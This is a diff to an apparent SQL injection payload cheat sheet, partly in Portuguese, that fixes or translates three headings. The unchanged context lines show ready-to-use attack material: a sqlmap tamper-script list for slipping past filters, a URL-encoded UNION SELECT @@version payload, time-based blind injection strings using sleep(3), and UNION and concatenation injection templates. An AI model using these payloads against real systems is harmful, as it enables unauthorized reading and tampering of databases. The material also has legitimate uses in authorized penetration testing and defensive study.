@@ -126,7 +126,7 @@ Tamper Script
 ```
 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
 ```
-#### SQL Injection with encode
+#### SQL Injection com encode
 ```
 ## Payload
 %61%61%61%61%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%3b%20%2d%2d%20%2d
@@ -227,7 +227,7 @@ AND IF (1=1, sleep(3),'false') -- //
 
 AND IF (1=1, sleep(3),'false') --
 ```
-#### Payloads Geral
+#### Payload Geral
 ```
 {payload}--
 {payload};--
@@ -252,7 +252,7 @@ AND IF (1=1, sleep(3),'false') --
 '||(SELECT {payload})--
 "||(SELECT {payload})--
 ```
-#### PostgeSQL
+#### PostgreSQL
 ```
 ' UNION ALL SELECT {payload}--
 ' UNION SELECT {payload}--
